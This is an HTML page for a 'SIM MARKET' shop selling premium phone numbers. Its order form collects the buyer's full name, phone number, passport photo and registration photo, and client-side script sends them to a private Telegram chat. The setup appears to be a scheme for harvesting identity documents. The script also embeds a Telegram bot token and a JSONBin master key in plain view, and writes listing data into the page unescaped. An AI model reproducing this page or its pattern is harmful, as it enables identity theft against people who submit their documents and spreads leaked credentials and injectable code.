       <!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>SIM MARKET</title>

<script src="https://cdn.tailwindcss.com"></script>

<style>

body{
background:
radial-gradient(circle at 20% 20%, #0f172a, #020617);
color:white;
font-family:system-ui;
}

.glass{
background:rgba(255,255,255,0.05);
backdrop-filter:blur(20px);
border:1px solid rgba(255,255,255,0.08);
}

.card{
transition:all .35s ease;
}

.card:hover{
transform:translateY(-6px) scale(1.02);
box-shadow:
0 20px 40px rgba(0,0,0,0.6),
0 0 25px rgba(255,215,0,0.15);
}

.gold{
background:linear-gradient(135deg,#FFD700,#FF8C00);
-webkit-background-clip:text;
-webkit-text-fill-color:transparent;
}

.btn{
background:linear-gradient(135deg,#facc15,#f59e0b);
color:black;
font-weight:800;
letter-spacing:1px;
transition:0.25s;
}

.btn:hover{
transform:scale(1.03);
box-shadow:0 0 25px rgba(255,200,0,0.5);
}

.vip{
border:1px solid rgba(255,215,0,0.4);
background:rgba(255,215,0,0.06);
}

input{
background:rgba(255,255,255,0.06);
border:1px solid rgba(255,255,255,0.1);
}

input:focus{
outline:none;
border-color:#facc15;
box-shadow:0 0 10px rgba(250,204,21,0.4);
}

</style>
</head>

<body class="pb-20">

<header class="glass sticky top-0 z-50 flex justify-between items-center px-6 py-5">

<div class="text-2xl font-black tracking-tight gold">
SIM MARKET
</div>

<div class="text-xs text-gray-400 uppercase tracking-widest">
premium numbers
</div>

</header>


<main class="max-w-3xl mx-auto p-6">

<div id="list" class="space-y-4">

<div class="text-center p-16 text-gray-500 animate-pulse uppercase text-xs tracking-widest">
загрузка витрины
</div>

</div>

</main>



<!-- MODAL -->

<div id="modal" style="display:none"
class="fixed inset-0 bg-black/90 z-[100] flex items-center justify-center p-6">

<div class="glass w-full max-w-md rounded-3xl p-8 space-y-6">

<div>
<h2 class="text-xl font-bold gold">Оформление номера</h2>
<p id="target-num" class="text-lg font-mono mt-2"></p>
</div>


<form id="regForm" class="space-y-4">

<input
type="text"
id="fio"
placeholder="ФИО по паспорту"
class="w-full p-4 rounded-xl"
/>

<input
type="tel"
id="client_phone"
placeholder="Контактный телефон"
class="w-full p-4 rounded-xl"
/>

<div class="space-y-2">
<label class="text-xs text-gray-400 uppercase">
Фото паспорта
</label>
<input type="file" id="photo_pass">
</div>

<div class="space-y-2">
<label class="text-xs text-gray-400 uppercase">
Фото прописки
</label>
<input type="file" id="photo_reg">
</div>


<button
id="sendBtn"
class="btn w-full py-4 rounded-xl"
>
ОТПРАВИТЬ ЗАЯВКУ
</button>

<button
type="button"
onclick="closeM()"
class="w-full text-xs text-gray-400 uppercase"
>
закрыть
</button>

</form>

</div>

</div>



<script>

const BIN_ID="69c9d640aaba882197a65742"
const MASTER_KEY="$2a$10$BIVZfOXmYVaG9NpPRW61Le//5yePRuieGl/ph3o6UYlHw4uOJQKtW"

const TG_TOKEN="8569235049:AAEsaW4ME-Ql6036i04tIbj--IPNT6JdroE"
const TG_CHAT_ID="8768514374"

let selectedNum=""

async function loadData(){

const r=await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`,{
headers:{'X-Master-Key':MASTER_KEY}
})

const data=await r.json()

render(data.record||[])

}



function render(items){

const list=document.getElementById("list")

list.innerHTML=items.map(i=>{

const vip=i.cat==="vip"||i.cat==="gold"

return`

<div
onclick="openM('${i.n}')"
class="card glass p-5 rounded-2xl flex justify-between items-center cursor-pointer ${vip?'vip':''}"
>

<div>

<div class="flex items-center gap-2">

<div class="text-xl font-mono font-bold">
${i.n}
</div>

${vip?`<span class="text-[9px] px-2 py-0.5 bg-yellow-500 text-black rounded uppercase font-bold">${i.cat}</span>`:''}

</div>

<div class="text-xs text-gray-400 mt-1 uppercase">
${i.o} • ${i.tarif||"базовый"}
</div>

</div>

<div class="text-right">

<div class="text-lg font-bold gold">
${i.t}₽
</div>

<div class="text-[10px] text-gray-500 uppercase">
купить
</div>

</div>

</div>

`

}).reverse().join("")

}



function openM(num){

selectedNum=num

document.getElementById("target-num").innerText=num

document.getElementById("modal").style.display="flex"

}



function closeM(){

document.getElementById("modal").style.display="none"

}



document.getElementById("regForm").onsubmit=async e=>{

e.preventDefault()

const btn=document.getElementById("sendBtn")

btn.innerText="Отправка..."
btn.disabled=true

const fio=document.getElementById("fio").value
const phone=document.getElementById("client_phone").value
const p1=document.getElementById("photo_pass").files[0]
const p2=document.getElementById("photo_reg").files[0]

const text=`💰 Новая заявка

Номер: ${selectedNum}
ФИО: ${fio}
Телефон: ${phone}`

await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({chat_id:TG_CHAT_ID,text})
})

const f1=new FormData()
f1.append("chat_id",TG_CHAT_ID)
f1.append("photo",p1)

await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`,{
method:"POST",
body:f1
})

const f2=new FormData()
f2.append("chat_id",TG_CHAT_ID)
f2.append("photo",p2)

await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`,{
method:"POST",
body:f2
})

alert("Заявка отправлена")

closeM()

btn.disabled=false
btn.innerText="ОТПРАВИТЬ ЗАЯВКУ"

}



window.onload=loadData

</script>

</body>
</html>
